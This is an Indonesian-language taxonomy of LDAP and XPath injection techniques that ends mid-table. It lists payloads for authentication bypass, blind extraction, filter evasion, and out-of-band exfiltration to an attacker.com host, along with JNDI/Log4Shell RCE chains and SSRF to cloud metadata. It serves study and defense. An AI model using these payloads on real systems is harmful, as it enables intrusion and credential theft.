---
title: "LDAP & XPath Injection"
description: ""
---
# LDAP Injection & XPath Injection — Taksonomi Mutasi/Variasi

---

## Struktur Klasifikasi

LDAP injection dan XPath injection termasuk dalam keluarga kerentanan yang sama: **structured query language injection terhadap hierarchical data store**. Filter LDAP melakukan query pada directory service berbentuk pohon (Active Directory, OpenLDAP, eDirectory), sementara ekspresi XPath melakukan query pada dokumen XML berbentuk pohon. Kedua bahasa ini tidak memiliki mekanisme kontrol akses yang ditemukan dalam database SQL — injeksi yang berhasil terhadap LDAP dapat mengekspos seluruh direktori, dan XPath injection yang berhasil dapat mengekspos seluruh dokumen XML. Ketiadaan fundamental otorisasi di level query inilah yang membuat kedua keluarga injeksi ini sangat berbahaya dibandingkan dengan SQL injection.

Taksonomi ini mengorganisir attack surface di sepanjang tiga sumbu:

- **Sumbu 1 (Primer — Mutation Target)**: Komponen struktural query mana yang sedang dimanipulasi. Ini membentuk isi utama dokumen, diorganisir ke dalam 9 kategori tingkat atas (§1–§9).
- **Sumbu 2 (Cross-cutting — Impact Type)**: Efek apa yang dicapai oleh mutasi — authentication bypass, data disclosure, RCE, privilege escalation, DoS, atau SSRF. Setiap subtipe diberi tag dengan dampak utamanya.
- **Sumbu 3 (Deployment Scenario)**: Di mana injeksi digunakan sebagai senjata — enterprise directory, XML document store, endpoint API, perangkat jaringan, atau layanan geospasial. Dibahas dalam bagian pemetaan skenario.

### Ringkasan Impact Type (Sumbu 2)

| Kode | Impact Type | Deskripsi |
|------|------------|-------------|
| **AUTH** | Authentication Bypass | Menghindari pemeriksaan login atau kontrol akses |
| **DISC** | Data Disclosure (Langsung) | Mengambil data dalam respons aplikasi |
| **BLIND** | Data Disclosure (Inferensial) | Mengekstrak data via side channel boolean/error/timing |
| **RCE** | Remote Code Execution | Mengeksekusi kode arbitrer pada sistem target |
| **PRIV** | Privilege Escalation | Meningkatkan dari akses terbatas ke akses dengan privilese lebih tinggi |
| **DoS** | Denial of Service | Menjatuhkan atau menurunkan ketersediaan sistem target |
| **SSRF** | Server-Side Request Forgery | Memaksa server membuat permintaan yang dikendalikan penyerang |

### Fondasi Struktural Bersama

Baik LDAP maupun XPath beroperasi pada data berbentuk pohon dengan pola query yang sama:

```
[Protocol Prefix] + [Path/Base] + [Filter/Predicate] + [Attribute Selection/Projection]
```

- **LDAP**: `ldap://host:port/baseDN?attributes?scope?filter`
- **XPath**: `//root/path[predicate]/child::node()`

Injeksi terjadi ketika input pengguna dikoncatenasikan ke salah satu komponen ini tanpa escaping yang tepat. Ruang mutasi ditentukan oleh komponen mana yang ditargetkan dan konstruksi sintaktis apa yang disuntikkan.

---

## §1. Manipulasi Logika Query

Kategori injeksi paling fundamental: mengubah struktur boolean/logis query untuk mengubah semantik evaluasinya. Filter LDAP dan predicate XPath sama-sama menggunakan logika boolean yang dapat disubversi melalui operator injection.

### §1-1. LDAP Filter Logic Injection

Search filter LDAP menggunakan notasi prefix dengan operator boolean eksplisit: `(&(condition1)(condition2))` untuk AND, `(|(condition1)(condition2))` untuk OR, dan `(!(condition))` untuk NOT. Injeksi terjadi ketika input yang dikendalikan penyerang keluar dari posisi nilai dan memperkenalkan komponen filter baru.

| Subtipe | Mekanisme | Contoh | Dampak |
|---------|-----------|---------|--------|
| **AND filter tautology** | Menyuntikkan `*` sebagai username maupun password membuat filter yang selalu bernilai benar | `(&(uid=*)(password=*))` | AUTH |
| **OR filter injection** | Menyisipkan `)(|(&` untuk memperkenalkan cabang OR yang selalu cocok | `user=*)(|(&` + `pass=*)(&` | AUTH |
| **NOT filter negation** | Menggunakan `!(condition)` untuk membalik logika pembatasan | `admin)(!(&#(1=0` | AUTH, PRIV |
| **Filter termination dengan garbage** | Menutup filter yang sah lebih awal dan menambahkan klausa yang valid secara sintaktis namun kosong secara semantis | `user=admin)(&)` + `pass=x)` | AUTH |
| **Multiple filter injection** | Menyuntikkan filter kedua yang lengkap setelah menutup filter pertama; perilakunya bergantung pada implementasi server (§8-1) | `user=x)(|(uid=*` | AUTH, DISC |
| **Null byte truncation** | Menambahkan `%00` (null byte) untuk memotong sisa filter, membuang pemeriksaan password | `user=admin)%00` | AUTH |

### §1-2. XPath Predicate Logic Injection

Predicate XPath yang terbungkus dalam `[...]` menggunakan operator boolean infix (`and`, `or`, `not()`). Injeksi memanipulasi ini untuk mengubah node mana yang dipilih.

| Subtipe | Mekanisme | Contoh | Dampak |
|---------|-----------|---------|--------|
| **OR tautology** | Menyuntikkan `' or '1'='1` agar predicate selalu bernilai benar | `[name='admin' or '1'='1']` | AUTH |
| **OR dengan true()** | Menggunakan fungsi bawaan XPath `true()` alih-alih perbandingan string | `' or true() or '` | AUTH |
| **Double OR tautology** | Merangkai kondisi OR sehingga precedence operator (AND sebelum OR) menjamin kebenaran terlepas dari kondisi lain | `x' or 1=1 or 'x'='y` | AUTH |
| **Null byte predicate termination** | Mengakhiri predicate dengan `%00` untuk membuang kondisi yang tersisa | `' or 1]%00` | AUTH |
| **Numeric predicate substitution** | Mengganti predicate string dengan selektor posisi numerik | `1` memilih node pertama terlepas dari pencocokan string | AUTH, DISC |
| **Conditional error injection** | Menggunakan `if/then/else` (XPath 2.0+) untuk memicu error pada kondisi benar, membocorkan informasi boolean | `if (condition) then error() else 0` | BLIND |

---

## §2. Wildcard dan Ekstraksi Berbasis Pola

Baik LDAP maupun XPath mendukung pencocokan wildcard/pola yang dapat dijadikan senjata untuk penemuan informasi tanpa memerlukan pengetahuan yang tepat tentang nilai yang tersimpan.

### §2-1. Eksploitasi Wildcard LDAP

Wildcard filter LDAP `*` mencocokkan nol atau lebih karakter dalam nilai atribut. Dikombinasikan dengan pencocokan substring, wildcard ini memungkinkan ekstraksi data secara progresif.

| Subtipe | Mekanisme | Contoh | Dampak |
|---------|-----------|---------|--------|
| **Universal wildcard match** | Menggunakan `*` sebagai nilai atribut untuk mencocokkan semua entri | `(&(uid=*)(objectClass=*))` | DISC |
| **Prefix wildcard brute-force** | Mengiterasi `(password=A*)`, `(password=B*)`, dll., dan menggunakan respons diferensial untuk menemukan nilai karakter demi karakter | `(&(uid=admin)(password=M*))` → cocok → `(&(uid=admin)(password=MY*))` | BLIND |
| **Suffix wildcard matching** | Menguji pola `*suffix` untuk menemukan nilai berdasarkan karakter akhirnya | `(mail=*@corp.com)` | DISC |
| **Substring wildcard matching** | Menggabungkan wildcard prefix dan suffix untuk menemukan nilai yang mengandung substring yang diketahui | `(description=*admin*)` | DISC |
| **samAccountName enumeration** | Menyuntikkan `(samAccountName=*)` untuk men-dump semua objek pengguna Active Directory | Parameter URL → `(samAccountName=*)` | DISC |
| **Binary search dengan wildcard** | Menggunakan perbandingan leksikografis dengan wildcard untuk melakukan binary search pada nilai atribut, mengurangi jumlah query dari O(n) menjadi O(log n) | Uji `(password>=M*)` lalu persempit rentang | BLIND |

### §2-2. Seleksi Node Wildcard XPath

Wildcard XPath (`*`, `//`, `node()`) memilih node berdasarkan posisi struktural daripada nama, memungkinkan penelusuran dokumen yang luas.

| Subtipe | Mekanisme | Contoh | Dampak |
|---------|-----------|---------|--------|
| **Root wildcard traversal** | Menggunakan `//*` untuk memilih semua elemen dalam dokumen | `//*` mengembalikan setiap node elemen | DISC |
| **Double-slash any-depth** | `//` menelusuri semua turunan tanpa memperhatikan kedalaman, memilih node yang cocok di level mana pun | `//password` menemukan semua node password | DISC |
| **Position-based iteration** | `[position()=N]` mengiterasi node saudara tanpa mengetahui namanya | `//user[position()=1]/child::node()[position()=2]` | DISC |
| **node() type wildcard** | `node()` mencocokkan tipe node apa pun (elemen, teks, komentar, PI) | `//user/child::node()` | DISC |
| **text() extraction** | `//text()` mengekstrak semua konten teks dari dokumen tanpa memperhatikan struktur elemen | `\| //text()` ditambahkan pada injeksi | DISC |
| **Pipe union operator** | Operator `\|` menggabungkan dua node-set, memungkinkan injeksi query yang sepenuhnya terpisah | `'] \| //user/password[('` | DISC |

---

## §3. Penemuan Schema dan Struktur

Sebelum mengekstrak data, penyerang harus menemukan struktur dari data store target — nama atribut untuk LDAP, nama elemen/node untuk XML. Kedua keluarga injeksi ini memiliki teknik khusus untuk fase rekognisi ini.

### §3-1. Penemuan Atribut LDAP

Direktori LDAP memiliki skema yang mendefinisikan atribut yang valid, tetapi query yang disuntikkan dapat menguji keberadaan atribut melalui respons diferensial.

| Subtipe | Mekanisme | Contoh | Dampak |
|---------|-----------|---------|--------|
| **Attribute existence probing** | Menyuntikkan `*(ATTRIBUTE=*)` untuk menguji apakah suatu atribut ada pada sebuah entri; perbedaan respons mengindikasikan ada/tidak adanya atribut | `*)(uid=*)` → 200 OK vs. `*)(nonexistent=*)` → respons berbeda | BLIND |
| **objectClass enumeration** | Melakukan query `(objectClass=*)` untuk menemukan tipe entri (person, user, group, computer, dll.) | `*)(objectClass=person` | DISC |
| **Default attribute brute-force** | Mengiterasi nama atribut LDAP umum: `cn`, `sn`, `uid`, `mail`, `givenName`, `userPassword`, `telephoneNumber`, `description`, `memberOf` | Script mengiterasi wordlist atribut | BLIND |
| **Null byte field delimiter** | Menambahkan `\x00` setelah uji field untuk mengakhiri filter yang disuntikkan dengan bersih sambil mempertahankan validitas | `*)(FIELD=*))\x00` | BLIND |
| **Error-based attribute type detection** | Menyuntikkan operator perbandingan yang gagal pada ketidakcocokan tipe (misalnya perbandingan numerik pada atribut string), menggunakan perbedaan error untuk menyimpulkan tipe atribut | `*)(uid>=0)` berhasil untuk numerik, gagal untuk string | BLIND |

### §3-2. Penemuan Schema XPath

Dokumen XML tidak memiliki schema yang dipaksakan pada saat query (kecuali divalidasi), sehingga penyerang menggunakan fungsi XPath untuk menghitung pohon dokumen.

| Subtipe | Mekanisme | Contoh | Dampak |
|---------|-----------|---------|--------|
| **count() child enumeration** | `count(/*[1]/*)` menentukan berapa banyak anak yang dimiliki elemen root, secara progresif memetakan pohon | `and count(/*)=1 and '1'='1` | BLIND |
| **name() element identification** | `name(/*[1])` mengembalikan nama anak elemen pertama; diiterasi untuk menemukan semua nama elemen | `and name(/*[1])='users'` | BLIND |
| **string-length() name sizing** | `string-length(name(/*[1]))` menentukan berapa banyak karakter dalam nama elemen, membatasi ruang pencarian | `string-length(name(//node))=INT` | BLIND |
| **starts-with() brute-force** | `starts-with(name(..), 'a')` mengiterasi melalui alfabet untuk menemukan nama elemen karakter demi karakter | `1=starts-with(name(..), 'u')` | BLIND |
| **Wordlist-based name guessing** | Menguji nama elemen umum yang diketahui (`user`, `password`, `email`, `role`, `admin`, `config`) terhadap `string-length()` dan `name()` untuk penemuan cepat | 20.000 kata dipindai dalam ~3 menit | BLIND |
| **string-to-codepoints() character extraction** | Mengonversi nama elemen ke urutan codepoint Unicode untuk lingkungan di mana perbandingan string difilter | `string-to-codepoints(name(/*[1]))` | BLIND |
| **comment() dan processing-instruction() discovery** | Menguji komentar XML dan instruksi pemrosesan yang mungkin berisi metadata sensitif | `count(/comment())=1` | BLIND |

---

## §4. Ekstraksi Data Blind/Inferensial

Ketika respons aplikasi tidak secara langsung mencerminkan hasil query, penyerang harus mengekstrak data melalui side channel — respons boolean, kondisi error, atau perbedaan timing. Ini adalah kategori teknik yang paling memakan tenaga namun juga paling universal berlaku.

### §4-1. LDAP Blind Extraction

Ekstraksi blind LDAP mengandalkan ada/tidaknya kecocokan wildcard `*` dalam kondisi filter, menghasilkan respons aplikasi diferensial (login berhasil/gagal, hasil pencarian/tidak ada hasil, kode status HTTP yang berbeda).

| Subtipe | Mekanisme | Contoh | Dampak |
|---------|-----------|---------|--------|
| **Character-by-character wildcard** | Menguji `(password=A*)`, `(password=B*)`, ... sampai kecocokan ditemukan, lalu `(password=MA*)`, `(password=MB*)`, dst. | `(&(uid=admin)(password=MYK*))` → kecocokan mengkonfirmasi prefix "MYK" | BLIND |
| **Byte-level octetStringOrderingMatch** | Untuk atribut biner (password yang di-hash), menggunakan OID `2.5.13.18` untuk perbandingan byte demi byte | `userPassword:2.5.13.18:=\xx\yy` | BLIND |
| **Booleanized true/false forcing** | Menyuntikkan pola yang diketahui-benar (`*(objectClass=*))(&objectClass=void`) dan diketahui-salah (`void)(objectClass=void))(&objectClass=void`) untuk mengkalibrasi respons boolean | Baseline respons True vs. False | BLIND |
| **Response timing differential** | Query yang cocok dengan banyak entri membutuhkan waktu lebih lama daripada yang tidak cocok; perbedaan timing mengungkapkan cocok/tidak cocok untuk ekstraksi blind | Direktori besar + wildcard = keterlambatan yang terukur | BLIND |
| **Error-based extraction** | Menyuntikkan filter yang malformed yang hanya menghasilkan error pada kondisi tertentu, menggunakan error/tidak-error sebagai sinyal boolean | Sintaks invalid dicapai secara kondisional | BLIND |
| **HTTP response size differential** | Bahkan tanpa data langsung dalam respons, entri yang cocok mungkin menghasilkan ukuran respons yang berbeda (header, redirect, variasi konten halaman) | Perbedaan Content-Length pada cocok vs. tidak cocok | BLIND |

### §4-2. XPath Blind Extraction

Ekstraksi blind XPath memanfaatkan library fungsi bawaan yang kaya (`substring()`, `string-length()`, `contains()`, `starts-with()`) untuk ekstraksi karakter-level yang presisi.

| Subtipe | Mekanisme | Contoh | Dampak |
|---------|-----------|---------|--------|
| **substring() character extraction** | Menguji setiap posisi karakter terhadap setiap nilai yang mungkin: `substring(target, position, 1)='a'` | `substring(//user[1]/password,1,1)="a"` | BLIND |
| **string-length() bounding** | Pertama menentukan panjang string target untuk membatasi loop ekstraksi | `string-length(//user[1]/password)=8` | BLIND |
| **contains() / starts-with()** | Menguji substring atau prefix untuk mempersempit ruang pencarian lebih cepat dari karakter demi karakter; binary search pada prefix mengurangi jumlah query | `contains(//user[1]/password, 'admin')`, `starts-with(//user[1]/password, 'pa')` | BLIND |
| **Conditional error-based extraction** | XPath 2.0+ `if/then/else` dengan fungsi `error()`: jika uji boolean bernilai benar, sebuah error dilempar; ada/tidaknya error adalah sinyalnya | `if (substring(//user[1]/pw,1,1)='a') then error() else 0` | BLIND |

---

## §5. Eksfiltrasi Data Out-of-Band

Teknik out-of-band (OOB) mengubah blind injection (1 bit per permintaan) menjadi ekstraksi bandwidth tinggi dengan membuat server target mengirimkan data melalui saluran eksternal yang dikendalikan penyerang.

### §5-1. Saluran OOB LDAP

LDAP sendiri memiliki kemampuan OOB yang terbatas, tetapi perangkaian dengan JNDI (§9-1) membuka vektor OOB yang signifikan.

| Subtipe | Mekanisme | Contoh | Dampak |
|---------|-----------|---------|--------|
| **JNDI LDAP referral** | Menyuntikkan referensi lookup JNDI yang menyebabkan server terhubung ke server LDAP yang dikendalikan penyerang, mengekstrak data dalam parameter koneksi | `${jndi:ldap://attacker.com/data}` | DISC, RCE |
| **DNS-based exfiltration via JNDI** | Menggunakan DNS lookup JNDI untuk mengenkode data yang diekstrak sebagai komponen subdomain dalam kueri DNS ke nameserver yang dikendalikan penyerang | `${jndi:dns://attacker.com/data}` | DISC |

### §5-2. Saluran OOB XPath

XPath 2.0+ menyediakan fungsi `doc()` dan `doc-available()` yang dapat membuat permintaan HTTP dan mengakses filesystem, memungkinkan eksfiltrasi OOB yang kaya.

| Subtipe | Mekanisme | Contoh | Dampak |
|---------|-----------|---------|--------|
| **doc() HTTP exfiltration** | `doc()` memuat dokumen XML eksternal via URL; dengan mengoncatenasikan data yang diekstrak ke dalam path URL, data dikirim ke server yang dikendalikan penyerang dalam permintaan HTTP | `doc(concat("http://attacker.com/", //user[1]/password))` | DISC |
| **doc-available() boolean OOB** | `doc-available()` mengembalikan true/false berdasarkan apakah URL dapat diakses; dikombinasikan dengan encoding data kondisional, melakukan ekstraksi boolean OOB | `doc-available(concat("http://attacker.com/", substring(//data,1,1)))` | BLIND |
| **doc() local file read** | `doc()` dengan protokol `file://` membaca file XML lokal dari filesystem server | `doc('file:///etc/config.xml')/*[1]/text()` | DISC |
| **DNS-based doc() exfiltration** | Ketika HTTP keluar diblokir tetapi DNS diizinkan, mengenkode data sebagai subdomain dalam URL `doc()` memaksa resolusi DNS dengan data yang tertanam | `doc(concat("http://", //data, ".attacker.com/"))` | DISC |
| **doc() SSRF / port scanning** | Menggunakan `doc()` untuk membuat permintaan ke layanan internal; pesan error yang berbeda untuk port terbuka/tertutup memungkinkan pemetaan jaringan internal | `doc('http://10.10.10.10:22/')` → timeout vs. connection refused | SSRF |
| **doc() dengan eksfiltrasi multi-field yang dikoncatenasikan** | Mengenkode beberapa field ke dalam satu URL untuk mengekstrak beberapa nilai per permintaan | `doc(concat("http://attacker.com/", //user, "/", //pass))` | DISC |

---

## §6. Encoding dan Penghindaran Filter

Ketika validasi input, WAF, atau filter di level aplikasi memblokir karakter injeksi yang jelas, penyerang menggunakan transformasi encoding dan alternatif sintaktis untuk mem-bypass deteksi sambil mempertahankan semantik query.

### §6-1. Penghindaran Encoding LDAP

LDAP memiliki dua konteks escaping yang berbeda (escaping DN per RFC 2253 dan escaping search filter per RFC 4515), dan kebingungan di antara keduanya sendiri merupakan attack surface.

| Subtipe | Mekanisme | Contoh | Dampak |
|---------|-----------|---------|--------|
| **Hex-encoded metacharacter** | Karakter khusus LDAP dapat dienkode sebagai pasangan hex `\XX` (RFC 4515): `\28` = `(`, `\29` = `)`, `\2a` = `*`, `\5c` = `\` | `\28uid=admin\29` mem-bypass filter tanda kurung | AUTH, DISC |
| **Null byte injection** | `\00` atau `%00` mengakhiri pemrosesan string di banyak implementasi sementara parser LDAP mungkin menginterpretasikannya berbeda | `admin)\00` | AUTH |
| **Unicode normalization bypass** | Mengirimkan karakter Unicode yang dinormalisasi menjadi metacharacter ASCII setelah normalisasi sisi server (misalnya tanda kurung fullwidth `﹙` `﹚` → `(` `)`) | `﹙uid=admin﹚` → dinormalisasi menjadi `(uid=admin)` | AUTH, DISC |
| **DN vs. filter escaping confusion** | Escaping DN (RFC 2253) dan escaping filter (RFC 4515) memiliki set karakter yang berbeda; escaping untuk konteks yang salah meninggalkan metacharacter tidak ter-escape | `#` di-escape dalam DN tetapi tidak dalam filter; `*` di-escape dalam filter tetapi tidak dalam DN | AUTH, DISC |
| **URL encoding passthrough** | Double URL encoding (`%2528` untuk `(`) mem-bypass pipeline decode-lalu-filter yang hanya mendekode sekali | `%2528uid%253D*%2529` | AUTH, DISC |
| **Mixed case operator injection** | Meskipun operator LDAP tidak case-sensitive, beberapa filter memeriksa casing tertentu | Bervariasi berdasarkan implementasi | AUTH |
| **Whitespace injection** | Menyisipkan spasi, tab, atau baris baru di antara komponen filter; beberapa parser menormalisasi whitespace sementara filter tidak | `( & (uid=admin) (password=*) )` | AUTH |

### §6-2. Penghindaran Encoding XPath

Sintaks XPath menggunakan karakter yang tumpang tindih dengan encoding HTML/XML, menciptakan peluang bypass lapisan encoding.

| Subtipe | Mekanisme | Contoh | Dampak |
|---------|-----------|---------|--------|
| **XML entity encoding** | Query XPath yang disematkan dalam XML dapat menggunakan entity encoding: `&apos;` untuk `'`, `&quot;` untuk `"`, `&lt;` untuk `<` | `&apos; or &apos;1&apos;=&apos;1` | AUTH |
| **Numeric character reference** | Menggunakan `&#39;` (desimal) atau `&#x27;` (hex) untuk karakter quote | `&#x27; or true() or &#x27;` | AUTH |
| **Double encoding** | URL-encoding karakter yang sudah di-URL-encode untuk mem-bypass decode-lalu-filter single-pass | `%2527` → didekode sekali menjadi `%27` → didekode lagi menjadi `'` | AUTH |
| **Quote type alternation** | Beralih antara single quote `'` dan double quote `"` untuk mem-bypass filter yang menargetkan satu tipe | `" or "1"="1` alih-alih `' or '1'='1` | AUTH |
| **Comparison operator substitution** | Mengganti `=` dengan operator ekuivalen seperti `<` dan `>` yang dikombinasikan (`not(x < y) and not(x > y)` ≡ `x = y`) ketika `=` difilter | `not(password < 'test') and not(password > 'test')` | BLIND |
| **Function-based value construction** | Menggunakan `concat()`, `string()`, `number()` untuk membangun nilai secara dinamis alih-alih menggunakan string literal yang akan difilter | `concat('adm','in')` alih-alih `'admin'` | AUTH, DISC |
| **Comment injection (XPath 2.0)** | XPath 2.0 mendukung komentar `(: comment :)` yang dapat memecah kata kunci untuk bypass filter | `tr(: :)ue()` — bergantung pada implementasi | AUTH |

---

## §7. Konstruksi Authentication Bypass

Authentication bypass adalah dampak dunia nyata dengan frekuensi tertinggi dari LDAP dan XPath injection. Bagian ini mengkonsolidasikan konstruksi khusus yang digunakan untuk menghindari autentikasi, mengambil dari teknik §1, §2, dan §6.

### §7-1. LDAP Authentication Bypass

Autentikasi LDAP biasanya bekerja dengan membangun filter seperti `(&(uid=INPUT)(userPassword=INPUT))` dan memeriksa apakah ada entri yang cocok. Injeksi menargetkan field uid atau password untuk memaksa kecocokan.

| Subtipe | Mekanisme | Contoh | Dampak |
|---------|-----------|---------|--------|
| **Wildcard credential bypass** | Kedua field diatur ke `*` mencocokkan entri mana pun dengan uid dan password yang tidak kosong | `uid=*` + `password=*` → `(&(uid=*)(userPassword=*))` | AUTH |
| **Known-user password bypass** | Username adalah pengguna valid yang diketahui; field password disuntikkan agar diabaikan | `uid=admin)(|(password=` + `password=anything))` | AUTH |
| **Filter comment-out** | Menutup filter lebih awal dan menggunakan null byte atau komentar untuk membuang pemeriksaan password | `uid=admin)%00` | AUTH |
| **Universal match dengan OR** | Menyuntikkan logika OR yang mencocokkan semua entri | `uid=*)(uid=*))(|(uid=*` | AUTH |
| **Negation-based bypass** | Menggunakan NOT untuk menegasikan kondisi salah, membuat kecocokan yang benar | `uid=admin)(!(password=nonexistent` | AUTH |
| **objectClass-based bypass** | Melakukan query berdasarkan objectClass alih-alih kredensial untuk mencocokkan semua entri pengguna | `uid=*)(objectClass=person` | AUTH |

### §7-2. XPath Authentication Bypass

Autentikasi XPath biasanya melakukan query: `//user[name='INPUT' and password='INPUT']`. Injeksi menargetkan salah satu field.

| Subtipe | Mekanisme | Contoh | Dampak |
|---------|-----------|---------|--------|
| **Simple OR tautology** | `' or '1'='1` di kedua field | `//user[name='' or '1'='1' and password='' or '1'='1']` | AUTH |
| **true() function injection** | Menggunakan fungsi bawaan alih-alih perbandingan | `' or true() or '` | AUTH |
| **Known-user dengan comment** | Menyuntikkan username yang diketahui dan mengkomentar sisa query | `admin' or '1'='1` di username, apa saja di password | AUTH |
| **Bracket closure dengan position** | Menutup tanda kurung predicate dan memilih hasil pertama | `admin'] \| //user[position()=1` | AUTH |
| **Empty string equality** | Menyuntikkan `'' or ''='` untuk membuat tautology yang mem-bypass bahkan filter pengecekan kosong | `' or ''='` | AUTH |
| **Numeric 1=1 dalam konteks double-quote** | Untuk aplikasi yang menggunakan double quote dalam query XPath | `" or "1"="1` | AUTH |
| **First-node selection** | Menyuntikkan `'][1]\|//[` untuk memilih pengguna pertama terlepas dari kredensial | Authentication bypass berbasis posisi | AUTH |

---

## §8. Eksploitasi Spesifik Lingkungan

Server LDAP dan implementasi XPath yang berbeda memiliki perilaku parsing, fitur yang didukung, dan keistimewaan yang berbeda. Teknik yang bekerja pada satu implementasi mungkin gagal atau menghasilkan hasil yang berbeda pada implementasi lain.

### §8-1. Perbedaan Implementasi Server LDAP

| Subtipe | Mekanisme | Platform yang Terpengaruh | Dampak |
|---------|-----------|------------------|--------|
| **Multiple filter handling — first-filter-wins** | Ketika beberapa filter lengkap disuntikkan, OpenLDAP hanya mengeksekusi filter pertama dan secara diam-diam mengabaikan filter berikutnya | OpenLDAP | AUTH, DISC |
| **Multiple filter handling — error on multiple** | Active Directory (ADAM/Microsoft LDS) melempar error ketika beberapa filter lengkap diserahkan | AD / Microsoft LDS | DoS (kebocoran info via error) |
| **Multiple filter handling — both executed** | SunOne Directory Server mengeksekusi kedua filter yang disuntikkan dan mengembalikan gabungan hasil | SunOne | AUTH, DISC |
| **OID-based matching rule** | Active Directory mendukung extensible matching rule via OID (misalnya `2.5.13.18` untuk octetStringOrderingMatch), memungkinkan perbandingan byte-level dari atribut biner | Active Directory | BLIND |
| **LDAP referral following** | Beberapa implementasi secara otomatis mengikuti referral LDAP ke server eksternal, memungkinkan SSRF ke instance LDAP yang dikendalikan penyerang | Bergantung pada konfigurasi | SSRF, RCE |
| **Anonymous bind allowance** | OpenLDAP dengan konfigurasi default mungkin mengizinkan anonymous bind, memungkinkan akses query tanpa autentikasi yang memperbesar dampak injeksi | OpenLDAP (konfigurasi default) | DISC |
| **Case sensitivity dalam attribute matching** | Perbandingan nilai atribut tidak case-sensitive secara default dalam LDAP (caseIgnoreMatch), tetapi beberapa implementasi menangani casing secara berbeda untuk atribut biner/octet | Semua platform | BLIND |

### §8-2. Perbedaan Implementasi XPath/XQuery

| Subtipe | Mekanisme | Platform yang Terpengaruh | Dampak |
|---------|-----------|------------------|--------|
| **XPath 1.0 — limited function set** | Hanya fungsi string/angka/boolean dasar yang tersedia; tidak ada `doc()`, tidak ada `if/then/else`, tidak ada `error()` | Library XPath 1.0 (libxml2, MSXML) | Hanya BLIND |
| **XPath 2.0+ — doc() enabled** | Fungsi `doc()` memungkinkan pemuatan dokumen eksternal via URL HTTP/file, memungkinkan eksfiltrasi OOB dan SSRF (§5-2) | Saxon, BaseX, engine XPath 2.0+ | DISC, SSRF |
| **XPath 2.0+ — conditional error** | `if/then/else` dan fungsi `error()` memungkinkan ekstraksi blind berbasis error (§4-2) | Saxon, engine XPath 2.0+ | BLIND |
| **XQuery superset exploitation** | XQuery adalah superset dari XPath yang menambahkan ekspresi FLWOR, deklarasi variabel, dan definisi fungsi — secara signifikan memperluas injection surface | eXist-db, BaseX, MarkLogic | DISC, RCE |
| **Extension function (saxon:evaluate, util:eval)** | Beberapa engine XPath/XQuery mengekspos extension function yang dapat mengevaluasi ekspresi arbitrer atau mengeksekusi perintah sistem | Saxon (evaluate), eXist-db (util:eval) | RCE |
| **commons-jxpath property evaluation** | Library Apache commons-jxpath mengevaluasi nama properti XPath secara tidak aman, memungkinkan pemanggilan metode Java melalui ekspresi XPath yang dibuat khusus (CVE-2024-36401) | GeoServer via commons-jxpath | RCE |
| **XSLT injection chaining** | Ketika XPath injection terjadi dalam konteks XSLT, fungsi spesifik XSLT tambahan mungkin tersedia, termasuk `document()`, `system-property()`, dan berpotensi namespace ekstensi `java:` atau `php:` | Xalan, Saxon, libxslt dengan ekstensi | RCE, DISC |

---

## §9. Perangkaian dengan Kelas Serangan yang Berdekatan

LDAP dan XPath injection sering berfungsi sebagai pijakan awal yang dirangkai dengan kelas kerentanan lain untuk mencapai hasil dengan dampak lebih tinggi.

### §9-1. Rantai LDAP → JNDI Deserialization

| Subtipe | Mekanisme | Kondisi Utama | Dampak |
|---------|-----------|---------------|--------|
| **JNDI LDAP lookup ke remote class loading** | Menyuntikkan referensi JNDI (`${jndi:ldap://attacker/exploit}`) memaksa JVM untuk terhubung ke server LDAP berbahaya yang mengembalikan objek Reference yang menunjuk ke URL codebase yang dikendalikan penyerang; JVM memuat dan menginstansiasi kelas jarak jauh tersebut | Aplikasi Java + JNDI aktif + tanpa pembatasan codebase (sebelum JDK 8u191) | RCE |
| **JNDI LDAP lookup dengan deserialization gadget** | Ketika remote class loading dibatasi (JDK 8u191+), server LDAP berbahaya mengembalikan objek Java yang di-serialisasi yang memicu rantai deserialization gadget (misalnya Commons Collections) yang ada di classpath target | Aplikasi Java + JNDI aktif + gadget rentan di classpath | RCE |
| **JNDI DNS exfiltration** | `${jndi:dns://attacker.com/data}` memicu DNS lookup yang mengekstrak data sebagai komponen subdomain, mem-bypass pembatasan HTTP egress | Aplikasi Java + JNDI aktif + DNS egress diizinkan | DISC |
| **Log4Shell pattern** | Input pengguna yang dicatat via Log4j 2.x memicu interpolasi JNDI lookup; LDAP berfungsi sebagai protokol untuk mengirimkan payload eksploit | Log4j 2.0-beta9–2.14.1 (CVE-2021-44228, CVSS 10.0); bypass perbaikan tidak lengkap di 2.15.0 (CVE-2021-45046); DoS di ≤2.16.0 (CVE-2021-45105) | RCE |

### §9-2. Rantai XPath → XXE/XSLT

| Subtipe | Mekanisme | Kondisi Utama | Dampak |
|---------|-----------|---------------|--------|
| **XPath injection dalam konteks XXE** | Jika dokumen XML yang di-query sendiri dikontrol via XXE, penyerang dapat memodifikasi struktur dokumen maupun menyuntikkan query XPath terhadapnya | Parser XML dengan pemrosesan external entity diaktifkan | DISC, RCE |
| **XSLT injection dari konteks XPath** | Mengeskalasi dari XPath injection ke XSLT injection ketika titik injeksi berada dalam stylesheet, mendapatkan akses ke kemampuan transformasi XSLT | Injeksi dalam stylesheet XSLT | RCE |
| **XPath → file read → credential harvesting** | Menggunakan `doc('file:///...')` (§5-2) untuk membaca file konfigurasi yang berisi kredensial database, API key, atau secret lainnya | XPath 2.0+ dengan `doc()` diaktifkan | DISC, PRIV |
| **XPath → SSRF → cloud metadata** | Menggunakan `doc()` untuk mengakses layanan cloud instance metadata (misalnya `http://169.254.169.254/...`) untuk mencuri kredensial IAM | XPath 2.0+ dalam lingkungan cloud | PRIV, SSRF |

### §9-3. LDAP → Eksploitasi Directory Service

| Subtipe | Mekanisme | Kondisi Utama | Dampak |
|---------|-----------|---------------|--------|
| **LDAP injection → privilege group discovery** | Menggunakan injeksi untuk menghitung atribut `memberOf`, menemukan keanggotaan grup admin dan hubungan privilese | LDAP injection dalam lingkungan AD | PRIV |
| **LDAP injection → credential harvesting** | Mengekstrak `userPassword`, `unicodePwd`, atau atribut kredensial lainnya melalui ekstraksi blind (§4-1) | Atribut dapat diakses oleh binding account | DISC, PRIV |
| **LDAP injection → service account enumeration** | Menemukan service account dengan atribut `servicePrincipalName` yang ditetapkan, mengidentifikasi akun yang dapat di-Kerberoast | Lingkungan Active Directory | PRIV |
| **LDAP injection → modifikasi GPO via kredensial yang ditemukan** | Menggunakan kredensial AD yang dipanen untuk memodifikasi Group Policy Object untuk lateral movement | Rantai post-exploitation | PRIV, RCE |

---

## Pemetaan Attack Scenario (Sumbu 3)

| Skenario | Arsitektur | Kategori Mutasi Utama | Risiko Utama |
